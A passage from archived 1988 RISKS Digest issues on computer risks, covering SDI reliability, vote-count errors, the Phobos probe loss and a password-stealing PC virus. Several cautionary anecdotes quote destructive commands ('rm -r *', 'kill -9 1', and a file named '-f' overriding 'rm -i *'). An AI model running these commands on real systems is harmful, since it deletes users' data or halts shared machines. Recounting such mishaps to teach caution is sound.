negative as that quoted from "The Australian" by George Michaelson in RISKS
DIGEST 7.39.  A company specializing in BMWs had done a lot of business
directly with dealers desperate to fix acceleration problems in some customers'
cars.

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.50.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.52.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-4</DOCNO>
<DOCOLDNO>IA012-000131-B034-99</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.52.html 128.240.150.127 19970217023107 text/html 17960
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:29:35 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 52</TITLE>
<LINK REL="Prev" HREF="/Risks/7.51.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.53.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.51.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.53.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 52</H1>
<H2> Wednesday 14 September 1988 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Tom Wicker column on computers, Vincennes and SDI 
</A>
<DD>
<A HREF="#subj1.1">
Gary Chapman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Computer error in vote tallying 
</A>
<DD>
<A HREF="#subj2.1">
Gary Chapman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Risks of Using Computers in Elections 
</A>
<DD>
<A HREF="#subj3.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Soviet Space Probe 
</A>
<DD>
<A HREF="#subj4.1">
Dave Feldmeier
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: "Single keystroke" 
</A>
<DD>
<A HREF="#subj5.1">
Matthew P Wiener
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  London Underground problem 
</A>
<DD>
<A HREF="#subj6.1">
Lindsay F. Marshall
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: Destructive Remote Controls 
</A>
<DD>
<A HREF="#subj7.1">
William Curtiss
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  An ANI Compromise 
</A>
<DD>
<A HREF="#subj8.1">
Mike Linnig
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  +++ RISKS Guidelines revisited +++ [&lt;&lt;&lt;PLEASE READ THIS.&gt;&gt;&gt;]
</A>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Tom Wicker column on computers, Vincennes and SDI 
</A>
</H3>
<address>
Gary Chapman
&lt;<A HREF="mailto:chapman@csli.Stanford.EDU ">
chapman@csli.Stanford.EDU 
</A>&gt;
</address>
<i>
Tue, 13 Sep 88 15:39:05 PDT
</i><PRE>

Tom Wicker, the famous columnist for the New York Times, has a column in the
Times today about computers, the Vincennes incident, and the SDI.  Wicker
has picked up on a story John Markoff has been working on for some time, on
whether complex computer networks exhibit chaotic behavior similar to the
mathematical phenomenon of chaos found in nature.  Wicker says that "these
two events [the Vincennes and a problem with a TRW computer that John de-
scribed in one of his articles] were unrelated except that they offer a com-
mon warning against too complete reliance upon computers and electronic
systems as substitutes for or multipliers of mankind's innate abilities."

". . . Star Wars will be heavily dependent upon a vast network of sensors,
computers and electronic weapons guidance systems girdling the globe and
only nominally under human control.

"Given the likelihood of breakdown at any of thousands of points in a system so
complex that no one has been able as yet even to design the software, it takes
a leap of faith to believe that the SDI would increase national security
against attack.  More likely, aping the computers at your local bank or an
airline ticket counter, the system would be 'down' when most needed."

Wicker then goes on to speculate on the dangers of an SDI computer system
subject to chaotic behavior.  Wicker quotes a professor of electrical engi-
neering at MIT, William Schreiber, who notes that the Aegis system in the Gulf
was at least responding to something that everyone on board had been trained to
deal with and had probably actually seen, i.e., a commercial airliner radar
signature.  What will happen with SDI or ICBM crews who are presented with
something no one has ever seen before?

"Not only may these high technology systems fail, or degenerate inexplicably
into chaos, and be more prone to do so as they grow ever more complex;
even when they function properly, the responses of the fallible human beings
who may have to interpret their messages can be disastrous--and humans may
be progressively less fit for a job so demanding.

"Thus, as we move inexorably into the world of high technology and control by
computer, the undeniable benefits will not come cheaply.  For mankind's
enhanced capacities, the price may be that we diminish, rather than increase,
what little dominance we have of our own destiny."

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Computer error in vote tallying 
</A>
</H3>
<address>
Gary Chapman
&lt;<A HREF="mailto:chapman@csli.Stanford.EDU ">
chapman@csli.Stanford.EDU 
</A>&gt;
</address>
<i>
Tue, 13 Sep 88 15:24:27 PDT
</i><PRE>

The New York Times reported today that a computer entry error increased the
vote count for the incumbent Lieutenant Governor of Delaware, S. B. Woo, and
made it appear he had won the election when he may have lost.  The correct
number of votes in one district was 28, but the operator keyed in 2,828 by
mistake.  There will be a recount of the votes statewide.

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Risks of Using Computers in Elections
</A>
</H3>
<address>
Peter Neumann 
&lt;<A HREF="mailto:neumann@csl.sri.com">
neumann@csl.sri.com
</A>&gt;
</address>
<i>
Tue, 13 Sep 1988 16:31:50 PDT
</i><PRE>

I noted in the July issue of the ACM Software Engineering Notes that there was
a panel discussion at COMPASS '88 on the topic of computer systems for counting
ballots.  Two of the panelists have written reports that deserve mention here:

  Lance J. Hoffman, ``Making Every Vote Count: Security and Reliability
  of Computerized Vote-Counting Systems'', Department of Electrical
  Engineering and Computer Science, The George Washington University,
  Washington D.C. 20052, 2nd printing, March 1988.

  Roy G. Saltman, ``Accuracy, Integrity, And Security In Computerized
  Vote-Tallying'', Institute for Computer Sciences and Technology,
  National Bureau of Standards, Gaithersburg MD 20899, NBS Special
  Publication, June 1988 (draft). 

These two reports are absolutely essential reading for anyone interested in the
problems arising in election software.  There is also a paper by Erik Nilsson
("A Bucket of Worms") on this subject, in the proceedings of CPSR's DIACS 88.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Soviet Space Probe
</A>
</H3>
<address>
&lt;<A HREF="mailto:dcf@ALLSPICE.LCS.MIT.EDU">
dcf@ALLSPICE.LCS.MIT.EDU
</A>&gt;
</address>
<i>
Wed, 14 Sep 88 09:00:46 EDT
</i><PRE>

A friend of mine who does satellite work expressed surprise that the Soviets
could lose a space probe so easily.  Apparently, US craft have a "panic"
mode that takes over if there is some problem (presumably in this case the
batteries running low).  The probe then realigns itself so that its solar
panels face the sun, its antenna faces the Earth and it waits for new
commands.  This seems like the right idea, but I don't know much about how
it works.  For instance, are the panic commands in ROM so that they can
never be overwritten?
                                        Dave Feldmeier

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Re: "Single keystroke"
</A>
</H3>
<address>
Matthew P Wiener
&lt;<A HREF="mailto:weemba%garnet.Berkeley.EDU@violet.berkeley.edu ">
weemba%garnet.Berkeley.EDU@violet.berkeley.edu 
</A>&gt;
</address>
<i>
Tue, 13 Sep 88 22:39:01 pdt
</i><PRE>

On Unix, even experienced users can do a lot of damage with "rm".  I had
never bothered writing a safe rm script since I did not remove files by
mistake.  Then one day I had the bad luck of typing "!r" to repeat some
command or other from the history list, and to my horror saw the screen
echo "rm -r *" I had run in some other directory, having taken time to
clean things up.

Maybe the C shell could use a nohistclobber option?  This remains the only
time I have ever rm'ed or overwritten any files by mistake and it was a
pure and simple gotcha! of the lowest kind.

Coincidentally, just the other day I listened to a naive user's horror
at running "rm *" to remove the file "*" he had just incorrectly created
from within mail.  Luckily for him, a file low in alphabetic order did
not have write permission, so the removal of everything stopped early.

ucbvax!garnet!weemba	Matthew P Wiener/Brahms Gang/Berkeley CA 94720

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
London Underground problem
</A>
</H3>
<address>
"Lindsay F. Marshall" 
&lt;<A HREF="mailto:Lindsay_Marshall%newcastle.ac.uk@NSS.Cs.Ucl.AC.UK">
Lindsay_Marshall%newcastle.ac.uk@NSS.Cs.Ucl.AC.UK
</A>&gt;
</address>
<i>
Wed, 14 Sep 88 13:46:43 WET DST
</i><PRE>

According to the news on the wireless this morning the London Undergound
system was distributed by a power failure that had damaged "the computer".
This system appears to control all the lifts, escalators and signals!!
Anyone know what really happened??
                                                  Lindsay

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
 Re: Destructive Remote Controls
</A>
</H3>
<address>
&lt;<A HREF="mailto:Curtiss@DOCKMASTER.ARPA">
Curtiss@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Tue, 13 Sep 88 20:54 EDT
</i><PRE>

Jim Williams writes of a remote control at a hotel which had the ominous
warning on it:

   "This remote control will only work on Beeblebrox Hotel TVs.
    REMOTE WILL DAMAGE your home TV sets."

He then asks if this is indeed possible.

I believe that it is entirely possible.  The control signals for the remote
could be chosen in such a way that the "on" control would send a command stream
that would be interpretted by a home TV set as "on" immediately followed by
"off".  Such cycling of the power will quickly damage the power control circuit
and send spikes to the rest of the components.  Most TVs require some form of
delay between an "on" and an "off" (actually, they are the same code, the TV
just changes state) but this could easily be accounted for.

For those doubters, I heard of a "crt saver" for the IBM a long time ago that
actually destroyed the monitor.  It would cut one of the locking frequencies (I
believe that is how it worked) which would make the sceen appear blank, but
would allow a charge to build on a capacitor.  Eventually the capacitor failed
and took the rest of the monitor with it.
                                                   William Curtiss

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
An ANI Compromise
</A>
</H3>
<address>
&lt;<A HREF="mailto:linnig@skvax1.csc.ti.com">
linnig@skvax1.csc.ti.com
</A>&gt;
</address>
<i>
Tue, 13 Sep 88 17:37:47 CDT
</i><PRE>

&gt; The `privacy' argument has two sides....  it is the right of an individual
&gt; *not* to have their phone number displayed, but it is also the right of the
&gt; individual *not* to answer anonymous calls.  A problem to which the solution
&gt; seems easy enough....  (now prove otherwise!)

[1] Suppose that all business phones had to "send" their phone numbers by law.

[2] Callers TO business phones have the right to withold their numbers
    using a prefix.  

[3] Individual-to-individual calls would "send" their phone numbers unless
    a prefix was used.

[4] Individuals COULD have their phones set up so that any non-ANI calls
    would be rejected (with a recording saying why).
 
[5] If you dial a number with a prefix, you get a recording if the target
    of the call ALWAYS gets ANI (e.g. the police emergency line); the
    call will complete at the callers option.

I suspect most folks would opt for [4] on their home phones.  This
should cut down on the number of obscene calls.  AIDs hot lines
can be called with the prefix -- the caller knows their number is
not being traced because they did not get a recording.  Callers to
businesses know their number is not being traced if they used a prefix.

Does that solve some of the problems?
                                          Mike Linnig, Texas Instruments

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
RISKS Guidelines revisited    [*** PLEASE READ THIS. ***]
</A>
</H3>
<address>
Peter Neumann 
&lt;<A HREF="mailto:neumann@csl.sri.com">
neumann@csl.sri.com
</A>&gt;
</address>
<i>
Tue, 13 Sep 1988 17:13:19 PDT
</i><PRE>

In the interest of keeping RISKS stimulating, and minimizing the mass of
suboptimal submissions, this is a reassertion of and elaboration upon a few of
the masthead guidelines, from mechanical to contextual.

  CONCISE: Short contributions are strongly preferred, assuming they satisfy 
  the other criteria.  Long ones may wait indefinitely, unless they are very
  hot. I would rather not have to impose a default limit, but would like to 
  urge consideration on your part.  Think of all the times you have had to 
  struggle with reading someone else's overly long messages that wandered 
  illogically, and try not to write that way.

  NONREPETITIOUS: Messages that go over the same ground as previous messages
  (including this one!) place a serious burden on all of us.  I cannot remember
  every contribution, but try very hard to minimize repetition.  Please try to
  check over previous issues before you fire off your comments.  When you
  relate to back issues, do so explicitly.  Messages that blindly incorporate
  an earlier message in its entirety (particularly when it is long) are very
  annoying.  Yes, I tend to delete most of the repeated portions, but you might
  better do that yourselves.  Interstitial annotations that comment almost
  paragraph by paragraph on the earlier messages are generally not very
  interesting anyway, so avoid those altogether.  (By the way, I usually keep
  reconsidering not-yet-included but still-possibly-interesting messages for
  several days until they eventually fall off the end of my attention span.
  However, I do not usually send out rejection notices, and trust the network
  servers to help you distinguish between that case and the case in which your
  mail was never received -- although that may not be a reliable process for
  some of the networks.)

  COHERENT: Writing skills are difficult to master.  But PLEASE take care in
  formulating your thoughts.  It makes your contributions much more readable,
  and saves agonizing back-and-forths later.  I hate playing English professor,
  but I cannot believe how bad some of the submitted writing is.  (I do edit
  when it is flagrant.)
  
  RELEVANCE: By now you know that I have a broad interpretation of "computers
  and related systems".  But I still get lots of contributions that are clearly
  not relevant.

There are a few of you RISKS contributors whose messages have been reliably
relevant, sound, concise, etc., and who always assume other readers are smart,
honest people with good intentions.  Many thanks to you.  I hope that others
will try harder to emulate you.  As a reward for you, this relatively boring
message is placed last in the issue (just in case you didn't get this far) --
in the ongoing struggle to make RISKS readable.  (For some others, however, it
probably should have been placed FIRST.)

Thanks to all RISKS folks for your support and help over the past three years.
The feedback I get seems to indicate that it is worth the effort to continue.
Peter

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.51.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.53.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-5</DOCNO>
<DOCOLDNO>IA012-000131-B034-110</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.53.html 128.240.150.127 19970217023119 text/html 22850
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:29:48 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 53</TITLE>
<LINK REL="Prev" HREF="/Risks/7.52.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.54.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.52.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.54.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 53</H1>
<H2> Thursday 15 September 1988 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Hurricane Gilbert 
</A>
<DD>
<A HREF="#subj1.1">
Richard A. Schafer via Matthew P Wiener
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Phobos I details 
</A>
<DD>
<A HREF="#subj2.1">
Dave Fiske
</A><br>
<A HREF="#subj2.2">
 Jack Goldberg
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Computers and Elections 
</A>
<DD>
<A HREF="#subj3.1">
Lance J. Hoffman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  The First "Virus" on Japanese PC 
</A>
<DD>
<A HREF="#subj4.1">
Yoshio Oyanagi
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Another one-key mishap 
</A>
<DD>
<A HREF="#subj5.1">
Larry Nathanson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Re: "Single keystroke" 
</A>
<DD>
<A HREF="#subj6.1">
Warren R. Carithers
</A><br>
<A HREF="#subj6.2">
 Paul Dubuc
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  More computer follies -- how not to design a console 
</A>
<DD>
<A HREF="#subj7.1">
Seth Gordon
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  GNU Emacs &amp; Security 
</A>
<DD>
<A HREF="#subj8.1">
A.Gaynor via Eliot Lear and Geoff Goodfellow
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Complex phones 
</A>
<DD>
<A HREF="#subj9.1">
Dave Fetrow
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  ISDN/ANI - What one switch vendor told me 
</A>
<DD>
<A HREF="#subj10.1">
Allen L. Chesley
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Hurricane Gilbert
</A>
</H3>
<address>
Matthew P Wiener
&lt;<A HREF="mailto:weemba@garnet.Berkeley.EDU ">
weemba@garnet.Berkeley.EDU 
</A>&gt;
</address>
<i>
Thu, 15 Sep 88 03:32:05 pdt
</i><PRE>

The following appeared in ucb.general:

 From: netinfo@GARNET.BERKELEY.EDU (Postmaster &amp; BITINFO)

 Hurricane Gilbert may cause various national and international
 network links to fail or to be closed down.  The follow message
 pertains to BITNET links in the mid-US. Links to Mexico and South
 America may also be affected.

 Date:         Wed, 14 Sep 88 13:15:17 CDT
 From: "Richard A. Schafer" &lt;SCHAFER%RICE.bitnet@jade.berkeley.edu&gt;

 Hurricane Gilbert is approaching the Texas coast.  If it appears to
 be heading into the Houston area, or close enough to it to cause serious
 problems, Rice will close down for an indeterminate time period, until
 the danger of the storm is past.  If the hurricane does in fact come
 through the Houston area, storm damage may cause power outages; the
 last hurricane in 1983 caused power outages of various lengths from
 a few minutes to several days.  We will try to keep you informed.

 The storm should hit the coastline Friday or Saturday.

 Richard

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Phobos I details    
</A>
</H3>
<address>
Dave Fiske
&lt;<A HREF="mailto:davef@brspyr1.brs.com ">
davef@brspyr1.brs.com 
</A>&gt;
</address>
<i>
Tue, 13 Sep 88 13:56:06 edt
</i><PRE>
Organization: BRS Information Technologies

from The Schenectady Gazette, Sept. 10, 1988.

SOVIET MISTAKE LED TO 'SUICIDE' FOR MARS PROBE

"Houston (UPI) - One of two ambitious Soviet probes hurtling toward
Mars was mistakenly ordered to 'commit suicide' when ground control
beamed up a long series of radio commands that included a single
incorrect letter, a top Soviet space official says.

"The Houston Chronicle reported yesterday in a copyright dispatch from
Moscow that Roald [sic] Sagdeev of the Soviet Institute of Space Research in
Moscow said it would be 'a miracle' if the Phobos 1 probe could be
saved.

*   *    *
"Sagdeev told the Chronicle the trouble began when control of the
Phobos 1 spacecraft was transferred from a command center in the Crimea
to a new facility near Moscow.

"'The controllers did not estimate how difficult it would be to work in
a new environment [near Moscow]', he said.

"Sagdeev said the flight controllers had to prepare a long message to
the computer of 20 to 30 pages, and in that message, a controller left
out one letter.

"'The [changes] would not have been required if the controller had been
working the computer in Crimea', he said.  When the flight controller
sent the incorrect message to the computer, 'by an unbelievable small
chance' there was a failure in the computer that allowed the error to
go undetected.

"In the end, he said, the absence of one letter from the computer
programming and the absence of a computer backup program, resulted in
the transmission of 'a comment [sic] to commit suicide' to Phobos 1."

</PRE>
<HR><H3><A NAME="subj2.2">
Phobos I details
</A>
</H3>
<address>
Jack Goldberg 
&lt;<A HREF="mailto:goldberg@csl.sri.com">
goldberg@csl.sri.com
</A>&gt;
</address>
<i>
Thu, 15 Sep 88 09:47:24 -0700
</i><PRE>

Key phrases in the Phobos report:  

1. ...by an unbelievably small chance, there was a failure in the
computer that allowed the error to go undetected.

2. ..and the absence of a computer backup program..

In (1), the issue seems to be error detection, such as is given by a check on
character type (probably not the case because of reference to a missing
character) or a longitudinal check on a character string or substring (parity,
sum, count, etc.)  Such checks may be performed in hardware or in software.  In
(2) the problem is characterized as the absence of a backup program, which is
not, strictly speaking, an error detection mechanism, but rather a remedy that
may invoked by detection of an error (an alternate remedy is to notify an
operator).  Error detection is arcane computer stuff, while "backup program" is
almost daily english.  My guess is that the problem was indeed a failure in
error detection, and that the reporter mischaracterized it as a failure in
backup.  In either case, it seems that the failure was caused by a combination
of human and computer system failures.

By the way, failure in error detection (and recovery, too), is a major type of
system error (e.g., reports by Siewiorek, CMU, and Iyer, U. Ill.)  The standard
explanation is that since errors are rare events, error detection mechanisms
are less frequently exercised and hence are more poorly debugged than the rest
of the system.
                                           Jack

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Computers and Elections
</A>
</H3>
<address>
Lance J. Hoffman 
&lt;<A HREF="mailto:LANCE@GWUVM.BITNET">
LANCE@GWUVM.BITNET
</A>&gt;
</address>
<i>
Thu, 15 Sep 1988 14:51 EDT
</i><PRE>

RISKS readers in the DC area may be interested in knowing that CPSR/DC chapter
is sponsoring a panel discussion on "Accuracy in Computer-Tabulated Elections"
Tues Oct 4, 7:15-9:30 pm at Room B120, Academic Center, 22 and I St. NW, George
Washington Univ., Washington, DC (Foggy Bottom metro).  Participants are Roy
Saltman, NBS; me; Carol Garner, Director of the Election Center (a nonprofit
organization for election officials; the closest thing they have to the ACM,
and moving slowly in that direction); and Eva Waskell, an activist whose name
stirs fear into the hearts of election officials across the country.  If you're
in town, stop in; it should be a good show.
                                                     Lance

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
The First "Virus" on Japanese PC
</A>
</H3>
<address>
Yoshio Oyanagi 
&lt;<A HREF="mailto:oyanagi@is.tsukuba.junet">
oyanagi@is.tsukuba.junet
</A>&gt;
</address>
<i>
Wed, 14 Sep 88 13:35:04+0900
</i><PRE>

     PC-VAN, the biggest Japanese personal computer network operated by NEC,
was found to be contaminated by a kind of virus, several newspapers reported
today (September 14).  This is, as far as I know, the first virus reported on a
Japanese PC.  The viruses so far reported in Japan were all on American PC or
WS.  PC-VAN is a telephone based network between NEC PC9800 personal computers,
the best sold PC (&gt; one million) in Japan.

     This virus does not destroy programs or data unlike those in US, but it
automatically posts the user's password on the BBS in crypto- graphic form.
The offender will later read the BBS and obtain the password.

     Several members of PC-VAN claim that they are charged for the access to
PC-VAN which they do not know.  This virus seems not to be contagious by its
own power.  The PC9800's OS was contaminated when the user carelessly run a
anonymously distributed program on the PC.

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Another one-key mishap
</A>
</H3>
<address>
Larry Nathanson
&lt;<A HREF="mailto:lan%bucsb@purdue.edu ">
lan%bucsb@purdue.edu 
</A>&gt;
</address>
<i>
15 Sep 88 20:47:52 GMT
</i><PRE>

On the 'one key bringing the house down' front:  On the machine here,
(and I suppose, on many multi-user machines under UNIX) if a user wishes
to kill the first job, waiting in his/her job queue, s/he types:

kill -9 %1 

I've heard that upon occaision the system operator will type: 

kill -9 1
 
Since the operator can kill ANY job, it works.  Job number 1 is a critical
process that maintains the multi-user status of the machine.  Once the above 
command is entered, the operator is the only user on the machine.  (Though
he may not realize it for a while!)

I'd hate to think what the analogue to this would be in the star wars
system!
  
-Larry Nathanson

    [(By the way) RISKS is performing a very important service: It is written
    by, and read by those who really should be informed by it- the computer
    professionals of today and tomorrow.  If they (we) do not appreciate and
    understand the risks of computers, then noone will.]

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Re: "Single keystroke"
</A>
</H3>
<address>
&lt;<A HREF="mailto:wrc%vienna@CS.RIT.EDU">
wrc%vienna@CS.RIT.EDU
</A>&gt;
</address>
<i>
Thu, 15 Sep 88 08:47:07 EDT
</i><PRE>

Matthew P Wiener writes:
&gt;On Unix, even experienced users can do a lot of damage with "rm"...

A similar situation occurred here a few months ago.  A student went to his
instructor for help in removing a file named "-f" from his account.  The
instructor first attempted "rm -f", which didn't complain but also didn't
remove the file.  After a few similar attempts, the instructor fell back on
the tried-and-true method of "rm -i *".  Some time passed during which no
messages appeared on the terminal; as the instructor began to grow uneasy,
the next shell prompt appeared.  An "ls" showed one file in the directory,
named "-f".  At this point, the student (who had been watching the proceedings
over the instructor's shoulder) commented, "If you weren't my teacher, I'd
think you just deleted all my files."

Fortunately, the student hadn't done any work on the files that day, so all
were recovered from the daily backup tapes.  The problem in this situation
was the interpretation by "rm" of the first file name, "-f", as an argument.
The result was that the "-i" option actually given by the instructor was
overridden by the name of the first file to be removed.

The blame for this event could be put in several different places:
UN*X command syntax (unlike VMS) doesn't sufficiently distinguish between
runtime options and other arguments (e.g., filenames); the UN*X filesystem
allows filenames which may look like valid options to commands; the "rm"
command doesn't recognize potential incompatibilities between its options
(i.e., "rm" shouldn't accept both the "-i" ("ask me before you delete
anything") and "-f" ("don't complain, just remove these files") options in
the same command line).  It is hard to fault the instructor for not knowing
that "rm" would override "-i" in this case, when (in his mind) he wasn't even
specifying "-f".

  Warren R. Carithers, Rochester Institute of Technology, Rochester NY 14623
